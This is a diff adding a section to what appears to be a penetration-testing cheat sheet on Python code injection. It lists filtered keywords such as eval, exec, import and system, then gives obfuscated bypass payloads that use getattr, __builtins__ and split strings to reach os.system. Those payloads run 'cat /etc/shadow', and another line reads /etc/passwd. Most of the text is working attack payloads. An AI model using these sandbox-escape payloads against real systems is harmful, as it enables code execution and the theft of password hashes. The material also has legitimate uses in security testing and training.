@@ -53,3 +53,23 @@
 #### 1) If the python executable asks for input, you can try to enter OS commands like:
 
 #### 2) Input: __import__('os').system('id')
+
+# BLACKLISTED PYTHON MODULES
+
+### Examples: 
+
+#### eval, exec, import, open, os, read, system, write
+
+#### Bypass techniques: String obfuscation
+
+#### Payload: print(globals())
+#### print(getattr(getattr(globals()['__builtins__'], '__im'+'port__')('o'+'s'), 'sys'+'tem')('cat /etc/shadow'))
+#### __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /etc/shadow')
+
+#### Bypass techniques: Input
+
+#### If the "eval" or "exec" modules are accepted, we can input arbitrary code.
+
+#### eval(input()) or exec(input())
+
+#### print(open("/etc/passwd", "r").read())
